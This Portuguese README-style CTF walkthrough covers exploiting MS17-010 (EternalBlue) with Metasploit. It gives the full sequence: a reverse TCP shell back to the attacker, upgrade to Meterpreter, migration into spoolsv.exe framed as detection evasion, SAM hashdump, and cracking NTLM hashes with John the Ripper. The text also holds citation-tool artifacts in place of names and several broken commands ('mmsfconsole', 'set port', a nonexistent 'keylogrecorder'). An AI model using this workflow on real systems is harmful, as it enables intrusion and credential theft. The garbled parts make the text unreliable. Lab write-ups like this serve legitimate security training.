<!-- =============================================== -->
<!--           MS17-010 | EternalBlue               -->
<!-- =============================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Vulnerability-MS17--010-critical?style=for-the-badge">
  <img src="https://img.shields.io/badge/Exploit-EternalBlue-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Protocol-SMBv1-blue?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Impact-RCE%20%7C%20Wormable-black?style=flat-square">
  <img src="https://img.shields.io/badge/CVE-2017--0144-informational?style=flat-square">
  <img src="https://img.shields.io/badge/Severity-Critical-red?style=flat-square">
  <img src="https://img.shields.io/badge/Focus-Offensive%20Security-black?style=flat-square">
</p>

---

# 💥 MS17-010 (EternalBlue)
## Exploração da Vulnerabilidade SMBv1 no Windows

> O **EternalBlue** é um dos exploits mais impactantes da história da cibersegurança moderna.  
> Associado à vulnerabilidade **MS17-010** (CVE-2017-0144), ele explora uma falha crítica no protocolo **SMBv1 (Server Message Block)** do Windows, permitindo **execução remota de código (RCE)** sem autenticação.
>
> Vazado publicamente em 2017 pelo grupo **:contentReference[oaicite:0]{index=0}**, o exploit foi posteriormente utilizado em ataques globais como o ransomware **:contentReference[oaicite:1]{index=1}** e **:contentReference[oaicite:2]{index=2}**, causando bilhões em prejuízos e paralisando infraestruturas críticas ao redor do mundo.
>
> O que tornou o EternalBlue devastador foi seu caráter **wormable**, permitindo propagação automática entre máquinas vulneráveis via porta TCP 445.

---

## 🎯 Objetivos do Documento

Este guia apresenta uma abordagem prática e técnica da exploração do MS17-010, cobrindo:

- Entendimento da vulnerabilidade no protocolo SMBv1
- Exploração utilizando **Metasploit Framework**
- Obtenção de shell remoto
- Conversão para **Meterpreter**
- Enumeração pós-exploração
- Extração e cracking de hashes NTLM
- Coleta de evidências em ambiente CTF
- Análise de impacto e importância de patch management

---

## 📌 Escopo Técnico

- **Tipo de Falha:** Remote Code Execution (RCE)
- **Protocolo Afetado:** SMBv1 (TCP 445)
- **Sistemas Afetados:** Windows Vista, 7, 8.1, Server 2008/2012, versões iniciais do Windows 10
- **Requisito:** Serviço SMB acessível externamente
- **Exploração:** Kernel-level pool corruption
- **Contexto:** Red Team · Pentest Interno · Laboratórios CTF

---

## 🧠 Conceitos-Chave Envolvidos

- Exploração de vulnerabilidades de rede
- Kernel exploitation
- Reverse Shell
- Meterpreter session management
- Credential dumping (SAM)
- Hash cracking (NTLM)
- Movimentação lateral potencial

---

## 🏷️ Tags

`#MS17010` `#EternalBlue` `#SMB`  
`#RCE` `#WindowsExploitation`  
`#Metasploit` `#PostExploitation`  
`#RedTeam` `#CyberSecurity`

---

## ⚠️ Aviso Legal

> Este material é destinado exclusivamente para **fins educacionais**, laboratórios controlados e ambientes com autorização explícita.
>
> A exploração de sistemas sem permissão é crime e pode resultar em consequências legais severas.

---

# MS17-010 (EternalBlue)

## Introdução

O **EternalBlue** (MS17-010) é, sem dúvida, um dos exploits mais famosos da história da segurança da informação. Vazado pelo grupo de hackers **Shadow Brokers** em 2017, ele explorava uma vulnerabilidade crítica no protocolo SMBv1 (Server Message Block) do Windows. O que tornou este exploit tão devastador foi sua capacidade de se propagar automaticamente, permitindo a criação de worms como o **WannaCry** e o **NotPetya**, que paralisaram empresas, hospitais e governos ao redor do mundo em questão de horas .

A vulnerabilidade afeta uma vasta gama de sistemas Windows, incluindo versões como Windows Vista, 7, 8.1, Server 2008, Server 2012 e até o Windows 10 em suas versões iniciais . Embora a Microsoft tenha lançado um patch de emergência em março de 2017 (MS17-010), inúmeros sistemas permanecem vulneráveis até hoje, seja por falta de atualização ou por estarem em redes legadas e sem suporte.

> **Aviso de Responsabilidade:** Este guia é estritamente para fins educacionais e de defesa de redes. O uso destas técnicas contra sistemas sem autorização explícita é ilegal e antiético .

---
## 1. Na Prática: Explorando o EternalBlue com Metasploit

### 1.1 Iniciando o Metasploit e Buscando o Módulo

O primeiro passo é iniciar o console do Metasploit e procurar pelo módulo de exploração do EternalBlue.

```bash
mmsfconsole
```

Dentro do console, usamos o comando `search` para encontrar módulos relacionados à vulnerabilidade.

```bash
search 'eternalblue'
```

**Resultado esperado:**

```text
0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
1   exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

O módulo de interesse é o de índice `0`: `exploit/windows/smb/ms17_010_eternalblue`, que ataca diretamente o kernel do Windows para executar código remoto .

```bash
use 0
# ou
use exploit/windows/smb/ms17_010_eternalblue
```

### 1.2 Configurando o Módulo

Após selecionar o exploit, é necessário verificar e configurar as opções obrigatórias.

```bash
show options
```

**Resultado simplificado:**

```text
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target
```

A opção mais importante é `RHOSTS`, que deve ser configurada com o endereço IP da máquina alvo.

```bash
set RHOSTS <IP_ALVO>
```

Substitua `<IP_ALVO>` pelo endereço IP real da máquina que você está atacando (ex: `10.10.10.5`).

### 1.3 Configurando o Payload

O payload é o código que será executado na máquina alvo após a exploração bem-sucedida. O Metasploit, por padrão, tenta usar um payload compatível, mas para o EternalBlue, precisamos especificar um que funcione com a arquitetura e o sistema operacional alvo.

```bash
set payload windows/x64/shell/reverse_tcp
```

**Explicação da escolha do payload:**

- **`windows/x64/`**: Indica que o payload é para sistemas Windows de 64 bits. O EternalBlue é um exploit de kernel que só funciona em sistemas x64, então o payload também deve ser x64 .

- **`shell/`**: Este é um payload de estágio (staged). Isso significa que ele envia um pequeno stager primeiro, que então baixa o restante da shell (o estágio). É útil para exploits com limitação de tamanho de payload inicial.

- **`reverse_tcp`**: O payload faz a máquina alvo se conectar de volta à nossa máquina atacante (reverse shell), o que é mais confiável do que tentar abrir uma porta no alvo (bind shell), já que firewalls geralmente bloqueiam conexões de entrada, mas permitem saídas.    

Alternativamente, poderíamos usar um payload `windows/x64/meterpreter/reverse_tcp` diretamente, mas o fluxo de "shell para meterpreter" é uma técnica valiosa de se conhecer.

Agora, precisamos configurar as opções do payload. Após definir o payload, use `show options` novamente para ver as novas opções disponíveis.

```bash
show options
```

Você verá opções como `LHOST` e `LPORT`.

- **`LHOST`**: É o endereço IP da sua máquina atacante (sua máquina Kali ou o IP da interface VPN no TryHackMe). **Atenção:** Em laboratórios como o TryHackMe, você deve usar o IP da sua interface VPN (geralmente `tun0`), e não o IP da sua rede local. Descubra-o com `ip a` ou `ifconfig`.

```bash
set LHOST <SEU_IP_ATACANTE>
```

- **`LPORT`**: É a porta na sua máquina que aguardará a conexão reversa. Pode ser qualquer porta não utilizada (ex: 4444).

```bash
set LPORT 4444
```

### 1.4 Executando o Exploit

Com tudo configurado, é hora de executar o ataque.

```bash
exploit
# ou
run
```

Se o alvo for vulnerável e a configuração estiver correta, você verá uma sequência de mensagens indicando o sucesso do ataque e, finalmente, um shell de sistema na máquina alvo.

**Resultado esperado:**

```text
[*] Started reverse TCP handler on <SEU_IP>:4444
[*] 10.10.10.5:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.5:445 - Host is likely VULNERABLE to MS17-010!
[*] 10.10.10.5:445 - Connecting to target for exploitation.
[+] 10.10.10.5:445 - Connection established for exploitation.
[+] 10.10.10.5:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.5:445 - CORE raw buffer dump...
... (muitas linhas) ...
[*] 10.10.10.5:445 - Sending stage (336 bytes) to <IP_ALVO>
[*] Command shell session 1 opened (<SEU_IP>:4444 -> <IP_ALVO>:49158) at 2023-...
Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----

C:\Windows\system32>
```

Parabéns! Você tem um shell na máquina alvo. Note que este é um shell simples do Windows (cmd.exe), com funcionalidades limitadas.

---
## 2. Pós-Exploração: De Shell para Meterpreter

### 2.1 Por que migrar para o Meterpreter?

O shell que obtivemos é funcional, mas limitado. O **Meterpreter** (Meta-Interpreter) é um payload avançado do Metasploit que roda inteiramente na memória da vítima (sem escrever no disco) e oferece uma infinidade de comandos de pós-exploração, como:

- **`hashdump`**: Extrai os hashes de senha do SAM (Security Account Manager).
- **`screenshot`**: Captura a tela da vítima.
- **`keylogrecorder`**: Inicia um keylogger.
- **`migrate`**: Permite mover o processo do Meterpreter para outro processo mais estável ou privilegiado.
- **`shell`**: Deriva um shell cmd.exe a partir do Meterpreter.
- Carregamento de extensões como `kiwi` (Mimikatz integrado).

Portanto, converter nossa shell simples em uma sessão Meterpreter é um passo crucial.

### 2.2 Colocando a Sessão em Background

Primeiro, precisamos suspender nossa sessão atual para interagir com o Metasploit novamente.

Pressione `CTRL + Z` e confirme com `y` para colocar a sessão em background.

```text
C:\Windows\system32> ^Z
Background session 1? [y/N]  y
```

### 2.3 Usando o Módulo de Conversão

Agora, listamos as sessões ativas para confirmar o ID da nossa shell.

```bash
sessions -l
```

**Resultado:**

```text
Active sessions
===============

  Id  Name  Type               Information                             Connection
  --  ----  ----               -----------                             ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Versi  <SEU_IP>:4444 -> <IP_ALVO>:49158
```

Em seguida, usamos o módulo `post/multi/manage/shell_to_meterpreter`. Este módulo injeta um payload Meterpreter na sessão de shell existente.

```bash
use post/multi/manage/shell_to_meterpreter
```

Verifique as opções do módulo:

```bash
show options
```

Configure as opções necessárias:

- **`SESSION`**: O ID da sessão de shell que queremos converter.

```bash
set SESSION 1
```

- **`LHOST`**: Novamente, o IP da sua máquina atacante (o mesmo usado no exploit).

```bash
set LHOST <SEU_IP_ATACANTE>
```

- **`LPORT`**: Uma porta **diferente** da usada anteriormente para o shell reverso. O módulo criará um novo handler para o Meterpreter.

```bash
set port 4433
```

Executando o módulo:

```bash
exploit
```

**Resultado esperado:**

```text
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on <SEU_IP>:4433
[*] Sending stage (200262 bytes) to <IP_ALVO>
[*] Meterpreter session 2 opened (<SEU_IP>:4433 -> <IP_ALVO>:49160) at 2023-...
[*] Stopping exploit/multi/handler
```

### 2.4 Interagindo com o Meterpreter

Liste as sessões novamente para ver a nova sessão Meterpreter.

```bash
sessions -l
```

**Resultado:**

```text
Active sessions
===============

  Id  Name  Type                     Information                             Connection
  --  ----  ----                     -----------                             ----------
  1         shell x64/windows         Shell Banner: Microsoft Windows [Versi  <SEU_IP>:4444 -> <IP_ALVO>:49158
  2         meterpreter x64/windows   NT AUTHORITY\SYSTEM @ JON-PC           <SEU_IP>:4433 -> <IP_ALVO>:49160
```

Interaja com a sessão Meterpreter (ID 2):

```bash
sessions 2
```

Agora você está no prompt do Meterpreter, indicado por `meterpreter >`.

---
## 3. Enumeração e Coleta com Meterpreter

### 3.1 Obtendo um Shell Interativo (cmd.exe)

Embora o Meterpreter tenha muitos comandos próprios, às vezes é útil ter um shell cmd.exe tradicional. Você pode obter um a partir do Meterpreter.

```bash
meterpreter > shell
```

**Resultado:**

```shell-session
Process 1792 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Dentro deste shell, podemos executar comandos normais do Windows. Vamos verificar o usuário atual.

```shell-session
C:\Windows\system32> whoami
nt authority\system
```

**Explicação:** `nt authority\system` é a conta de mais alto privilégio no Windows, equivalente ao "root" no Linux. Isso significa que temos controle total sobre a máquina.

Para sair do shell e voltar ao Meterpreter, digite `exit`.

```Shell-session
C:\Windows\system32> exit
meterpreter >
```

### 3.2 Gerenciamento de Processos e Migração

O comando `ps` lista todos os processos em execução na máquina alvo. Isso é útil para identificar processos interessantes para migração.

```bash
meterpreter > ps
```

**Resultado (trecho):**

```text
Process List
============

 PID   PPID  Name                Arch  Session  User                          Path
 ---   ----  ----                ----  -------  ----                          ----
 1304  712   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2116  2284  meterpreter.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Temp\... (nosso processo)
```

**Explicação da migração:** O processo do Meterpreter (`meterpreter.exe` no exemplo) pode ser instável ou chamar a atenção. Migrar significa injetar o código do Meterpreter em outro processo legítimo do sistema. Isso tem várias vantagens:

- **Estabilidade:** Se o processo original for morto, a sessão é perdida. Migrar para um processo de sistema como `spoolsv.exe` (serviço de impressão) torna a sessão mais persistente.
- **Ofuscação:** O Meterpreter "se esconde" dentro de um processo que parece inocente, dificultando a detecção por soluções de segurança.
- **Privilégios:** Se o processo alvo tiver privilégios mais altos (como `SYSTEM`), a migração pode ser uma forma de elevação, embora já sejamos SYSTEM neste caso.

Vamos migrar para o processo `spoolsv.exe` (PID 1304).

```bash
meterpreter > migrate 1304
```

**Resultado:**

```bash
[*] Migrating from 2116 to 1304...
[*] Migration completed successfully.
meterpreter >
```

Agora, nosso Meterpreter está rodando dentro do processo legítimo do Windows.

### 3.3 Extraindo Hashes de Senha

O comando `hashdump` é um dos mais poderosos do Meterpreter. Ele lê a base de dados SAM (Security Account Manager) do registro do Windows e exibe os hashes NTLM de todos os usuários locais .

```bash
meterpreter > hashdump
```

**Resultado:**

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Explicação do formato:**  
`usuário:RID:LM_HASH:NT_HASH:::`

- **LM_HASH:** É um formato antigo e fraco. Quando aparece como `aad3b435b51404eeaad3b435b51404ee`, significa que está em branco ou desabilitado (é um hash nulo).
- **NT_HASH:** É o hash NTLM moderno. É a parte que realmente nos interessa para quebrar a senha.

No exemplo, o hash NT do usuário `Jon` é `ffb43f0de35be4d9917ac0cc8ad57f8d`. O hash do Administrador é um hash nulo (`31d6cfe0d16ae931b73c59d7e0c089c0`), o que geralmente indica que a conta está desabilitada ou que a senha está em branco (embora contas de administrador em branco sejam raras em sistemas modernos).

---
## 4. Cracking de Hashes com John the Ripper

Agora que temos o hash NTLM do usuário `Jon`, podemos tentar quebrá-lo para obter a senha em texto claro.

### 4.1 Preparando o Arquivo de Hash

Primeiro, copie a linha do Jon para um arquivo de texto. Você pode fazer isso diretamente no terminal do atacante.

```bash
echo 'Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::' > hash.txt
```

### 4.2 Executando o John the Ripper

O John the Ripper é uma ferramenta popular de quebra de senhas. Usaremos a wordlist clássica `rockyou.txt`.

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Explicação dos parâmetros:**

- **`--format=NT`**: Especifica que o hash está no formato NT (NTLM).
- **`--wordlist=...`**: Caminho para a wordlist que será usada no ataque de dicionário.
- **`hash.txt`**: O arquivo contendo o hash.

### 4.3. Exibindo o Resultado

Após a execução (pode levar alguns segundos), você pode ver a senha encontrada com o comando:

```bash
john --format=NT --show hash.txt
```

**Resultado esperado:**

```text
Jon:alqfna22:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
1 password hash cracked, 0 left
```

A senha do usuário `Jon` é **`alqfna22`**.

---
## 5. Procurando as Flags (CTF)

Em laboratórios de Capture The Flag (CTF) como os do TryHackMe, o objetivo final é encontrar "flags" (strings no formato `flag{...}`) que comprovam a conclusão de cada etapa.

### **Flag 1: Acesso Inicial**

A dica para a primeira flag é que ela está na raiz do sistema (`C:\`). A partir do Meterpreter, navegue até lá e liste os arquivos.

```bash
meterpreter > pwd
C:\Windows\system32

meterpreter > cd ../..
meterpreter > pwd
C:\

meterpreter > ls
```

**Resultado (trecho):**

```text
100666/rw-rw-rw-  24     fil   2019-03-17 19:27:21 +0000  flag1.txt
```

Leia o conteúdo do arquivo:

```bash
meterpreter > cat flag1.txt
flag{access_the_machine}
```

**Flag 1:** `flag{access_the_machine}`

### **Flag 2: Acesso ao SAM**

A dica para a segunda flag é procurar em locais onde o Windows armazena senhas. Um desses locais é o diretório de configuração do sistema, onde o arquivo SAM reside. Navegue até `C:\Windows\System32\config`.

```bash
meterpreter > cd Windows/System32/config
meterpreter > ls
```

**Resultado (trecho):**

```text
100666/rw-rw-rw-  34     fil   2019-03-17 19:32:48 +0000  flag2.txt
```

Leia o conteúdo:

```bash
meterpreter > cat flag2.txt
flag{sam_database_elevated_access}
```

**Flag 2:** `flag{sam_database_elevated_access}`

### **Flag 3: Documentos do Usuário**

A dica para a terceira flag é verificar os documentos do usuário `Jon`. Navegue até `C:\Users\Jon\Documents`.

```bash
meterpreter > cd C:/Users/Jon/Documents
meterpreter > ls
```

**Resultado (trecho):**

```text
100666/rw-rw-rw-  37     fil   2019-03-17 19:26:36 +0000  flag3.txt
```

Leia o conteúdo:

```bash
meterpreter > cat flag3.txt
flag{admin_documents_can_be_valuable}
```

**Flag 3:** `flag{admin_documents_can_be_valuable}`

---
## **Conclusão**

Este laboratório demonstrou de forma prática o ciclo completo de um ataque utilizando uma vulnerabilidade crítica do mundo real, o EternalBlue. Percorremos todas as etapas essenciais:

1. **Reconhecimento e Preparação:** Busca pelo módulo correto no Metasploit e configuração do exploit e payload.
2. **Exploração:** Execução do ataque para obter um shell inicial na máquina alvo.
3. **Pós-Exploração:** Conversão do shell simples para uma sessão Meterpreter avançada, permitindo maior controle e estabilidade.
4. **Enumeração:** Uso de comandos como `ps`, `migrate` (para ofuscação e estabilidade) e `hashdump` (para extrair credenciais).
5. **Análise de Credenciais:** Quebra dos hashes capturados com o John the Ripper para obter senhas em texto claro.
6. **Coleta de Evidências:** Navegação pelo sistema de arquivos para encontrar as flags, simulando a busca por dados sensíveis.    

A lição mais importante deste exercício é a **importância crítica da gestão de patches e atualizações de segurança**. Uma vulnerabilidade de 2017 ainda é explorável hoje em sistemas não atualizados, demonstrando que a segurança é um processo contínuo, não um estado final.

---
## **Referências e Leituras Complementares**

Para aprofundar seus conhecimentos sobre os temas abordados, consulte os seguintes recursos:

- **Documentação Oficial do Metasploit:** [https://docs.rapid7.com/metasploit/](https://docs.rapid7.com/metasploit/)

- **Análise detalhada do MS17-010 (EternalBlue) pela Microsoft:** [https://msrc.microsoft.com/update-guide/vulnerability/MS17-010](https://msrc.microsoft.com/update-guide/vulnerability/MS17-010)

- **Página do módulo `ms17_010_eternalblue` no Rapid7:** [https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

- **Guia sobre o Meterpreter:** [https://www.offsec.com/metasploit-unleashed/meterpreter-basics/](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)

- **John the Ripper - Documentação:** [https://www.openwall.com/john/doc/](https://www.openwall.com/john/doc/)

- **TryHackMe - Ice Room (Lab baseado em EternalBlue):** [https://tryhackme.com/room/ice](https://tryhackme.com/room/ice)
